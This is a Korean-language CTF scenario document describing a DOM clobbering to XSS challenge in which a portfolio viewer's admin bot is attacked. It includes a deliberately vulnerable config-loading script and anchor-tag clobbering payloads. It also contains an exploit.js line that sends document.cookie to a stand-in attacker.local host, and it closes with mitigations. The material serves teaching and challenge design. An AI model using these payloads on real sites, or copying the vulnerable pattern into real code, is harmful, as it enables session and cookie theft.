---
title: DOM Clobbering leading to XSS — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, client-side, dom-clobbering, xss, csp-bypass]
confidence: high
---

# DOM Clobbering leading to XSS — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Portfolio Builder (개인 포트폴리오 생성기)
- **난이도**: Medium-High
- **핵심 컨셉**: 최신 클라이언트 사이드 웹 해킹 기법인 **DOM Clobbering** 취약점을 이용해 클라이언트 단의 입력 필터 및 자바스크립트 논리 설정을 무력화하고 XSS(Cross-Site Scripting)를 실행하는 문제입니다. 사용자는 자신의 포트폴리오를 HTML 마크업 형식으로 업로드하여 꾸밀 수 있습니다. 서버는 백엔드와 프론트엔드에서 위험한 스크립트 태그를 거르는 보안 정화 도구(Sanitizer)를 거치지만, HTML 파싱 우선순위를 조작해 자바스크립트의 글로벌 환경설정 변수를 오염시킴으로써 외부의 임의 스크립트를 동적으로 실행할 수 있게 됩니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Frontend / Portfolio Viewer**: 사용자 포트폴리오 HTML 페이지를 렌더링하고, 글로벌 설정 스크립트(`config.js`)를 로드하여 기능을 초기화합니다.
- **Backend Service (Python/Flask or Node.js)**: 
  - 사용자 포트폴리오 HTML 저장 및 로드 API 제공.
  - 관리자 봇(Admin Bot / Headless Browser) 기능 포함. 관리자 봇은 신고 접수 시 공격자가 업로드한 포트폴리오 화면을 검사하며, 이때 관리자 세션에 진짜 플래그가 담겨 있습니다.
- **Flag 위치**: 
  - 관리자 봇의 브라우저 쿠키(Cookie) 값: `flag=FLAG{dom_clobbering_for_xss_bypass}`

### 2.2 취약점 지점
1. **DOM Clobbering**:
   - 자바스크립트 코드 내에 정의되지 않았거나 전역 객체로 초기화되는 변수(예: `window.config.themeUrl` 또는 `window.apiEndpoint`)가 존재합니다.
   - 사용자가 삽입한 HTML 소스에 `id` 또는 `name` 속성을 지닌 특정 요소(예: `<a id="config" href="http://attacker.com/malicious.js">`)를 배치하면, 브라우저가 DOM 트리를 빌드할 때 글로벌 스코프의 `window.config` 객체를 해당 DOM 요소로 덮어쓰게(Clobbering) 됩니다.
   - 이에 따라 정상 스크립트가 로드 주소를 결정하기 위해 `window.config.themeUrl`을 조회할 때, 실제 정의된 객체가 아니라 공격자가 임의 주소를 기입해 둔 `<a>` 태그의 `href` 속성이 문자열(String)로 캐스팅되어 반환되며 최종적으로 임의 스크립트가 웹 브라우저 컨텍스트 내에서 동작합니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 / 리소스 | 메소드 | 인증 | 입력 값 | 반환 값 | 비고 |
|---------------------|--------|------|---------|---------|------|
| `/portfolio/<id>` | GET | 없음 | 없음 | 포트폴리오 HTML | HTML 렌더링 및 클라이언트 사이드 변조 유발 위치 |
| `/api/portfolio` | POST | 없음 | `{"content": "HTML 마크업"}` | 생성 성공 유무 및 ID 반환 | 포트폴리오 HTML 저장 위치 |
| `/report` | POST | 없음 | `{"id": "포트폴리오ID"}` | `{"status": "reported"}` | 관리자 봇이 해당 포트폴리오를 조회하게 유도 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. 자바스크립트 분석
공격자는 포트폴리오 뷰어의 HTML 소스코드와 함께 호출되는 자바스크립트(`app.js`)를 확인합니다.
- *취약 코드 식별*:
  ```javascript
  // 글로벌 설정 객체 window.config가 선언되어 있지 않다면 생성하도록 시도
  var config = window.config || { themeUrl: "/static/themes/default.js" };
  
  // 동적으로 테마 스크립트를 로드하여 렌더링 적용
  var script = document.createElement("script");
  script.src = config.themeUrl; 
  document.body.appendChild(script);
  ```

### Step 2. DOM Clobbering 페이로드 작성
`window.config` 변수가 선언되어 있지 않거나 `window` 속성 탐색으로 설정되어 있으므로, 공격자는 HTML 마크업을 이용해 이를 오염시킵니다.
- **클로버링 조건**:
  `config`라는 `id`를 가진 `<a>` 태그를 생성하고, `href` 속성에 실행시키고자 하는 공격용 자바스크립트 파일 주소를 할당합니다.
- **작성할 HTML 페이로드**:
  ```html
  <!-- config 전역 변수를 clobbering하여 config.themeUrl이 공격자 주소를 가리키도록 유도 -->
  <a id="config" href="http://attacker.local/exploit.js"></a>
  <a id="config" name="themeUrl" href="http://attacker.local/exploit.js"></a>
  ```
  *(참고: 이중 객체 깊이인 `config.themeUrl`을 덮어쓰기 위해 동일한 `id`를 가진 여러 태그를 조합하거나 `name` 속성을 엮어 브라우저가 HTMLCollection 형태로 참조하게 설계합니다.)*

### Step 3. XSS 페이로드 저장 및 공격자 서버 구축
1. 외부 공격자 웹서버(`http://attacker.local/exploit.js`)에 쿠키를 외부로 전송하는 페이로드를 업로드해 둡니다.
   ```javascript
   // exploit.js
   fetch("http://attacker.local/log?flag=" + document.cookie);
   ```
2. 포트폴리오 내용에 위의 DOM Clobbering 페이로드를 넣어 저장하고 `id`를 받아옵니다.

### Step 4. 관리자 봇 트리거 및 플래그 탈취
1. `/report` 엔드포인트를 통해 관리자 봇에 해당 포트폴리오의 ID를 신고합니다.
2. 관리자 봇이 접속하면 DOM Clobbering 취약점에 의해 `app.js`는 `http://attacker.local/exploit.js` 스크립트를 로드해 동작시킵니다.
3. 공격자 서버에 관리자의 쿠키 플래그(`FLAG{dom_clobbering_for_xss_bypass}`)가 기록됩니다.

---

## 5. 취약점 유발 프론트엔드 HTML/자바스크립트 코드 스니펫

```html
<!-- templates/view.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Portfolio Viewer</title>
</head>
<body>
    <div id="portfolio-area">
        <!-- 서버가 위험한 <script>, <iframe> 등은 필터링했지만 아래 사용자 마크업이 그대로 출력됨 -->
        <a id="config"></a>
        <a id="config" name="themeUrl" href="http://attacker.local/exploit.js"></a>
    </div>

    <!-- 취약한 렌더링 관리자 자바스크립트 로드 -->
    <script>
        // 전역 config의 존재 여부를 체크하지만 DOM Clobbering에 취약함
        // 만약 ID가 'config'인 엘리먼트가 존재하면 window.config는 HTMLCollection 또는 Element가 됨
        var config = window.config || { themeUrl: "/static/themes/default.js" };

        // DOM Clobbering에 의해 config.themeUrl은 <a> 태그의 href 문자열로 해석됨
        if (config && config.themeUrl) {
            var script = document.createElement("script");
            script.src = config.themeUrl; 
            document.body.appendChild(script);
        }
    </script>
</body>
</html>
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **로컬 스코프 변수 사용 및 엄격한 네임스페이스 (Safe Global Variables)**:
   - 전역 스코프(`window.config`)에 의존하는 대신 `const` 또는 `let`을 사용하여 재정의를 방지하고 프라이빗 네임스페이스 내에 로직을 위치시킵니다.
   - **수정 예시**:
     ```javascript
     (function() {
         const config = { themeUrl: "/static/themes/default.js" };
         // 외부 DOM 요소를 window 속성으로 조회하지 못함
     })();
     ```
2. **DOM Purify와 같은 성숙한 Sanitizer 라이브러리 사용**:
   - 사용자 입력을 안전하게 렌더링하기 전 DOMPurify 등의 도구를 사용해 `id`나 `name` 속성을 제거(또는 접두사를 강제 추가)하여 DOM이 임의로 조작되는 것을 완전히 차단합니다.
3. **콘텐츠 보안 정책 (CSP) 수립**:
   - `Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com;`과 같은 헤더 정책을 구성하여 외부 임의 도메인(`attacker.local`)으로부터 실행 스크립트가 로드되는 것을 브라우저 차원에서 차단합니다.
